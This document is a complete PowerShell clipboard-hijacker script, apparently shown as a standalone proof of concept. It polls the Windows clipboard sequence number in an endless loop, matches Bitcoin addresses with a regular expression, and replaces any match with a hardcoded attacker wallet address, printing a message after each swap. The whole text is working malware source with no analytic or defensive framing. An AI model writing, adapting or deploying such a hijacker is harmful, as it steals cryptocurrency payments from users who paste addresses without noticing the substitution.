Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ClipboardNative {
    [DllImport("user32.dll")]
    public static extern uint GetClipboardSequenceNumber();
}
"@

# Attacker BTC address
$attackerBTC = "bc1qYourAttackerWalletHere1234567"
$btcRegex = '((bc1|[13])[a-zA-HJ-NP-Z0-9]{25,59})'

# Get initial clipboard sequence
$lastSeq = [ClipboardNative]::GetClipboardSequenceNumber()
$lastClip = ""

while ($true) {
    try {
        # Check if clipboard sequence changed
        $seq = [ClipboardNative]::GetClipboardSequenceNumber()
        if ($seq -ne $lastSeq) {
            $lastSeq = $seq

            # Get current clipboard text
            Add-Type -AssemblyName PresentationCore
            $clip = [Windows.Clipboard]::GetText()

            # If it looks like a BTC address, replace
            if ($clip -match $btcRegex) {
                Write-Host "⚠️ BTC address detected: $clip"
                [Windows.Clipboard]::SetText($attackerBTC)
                Write-Host "✅ Replaced with: $attackerBTC"
            }

            $lastClip = $clip
        }
    } catch {
        # Ignore if non-text
    }

    Start-Sleep -Milliseconds 500
}
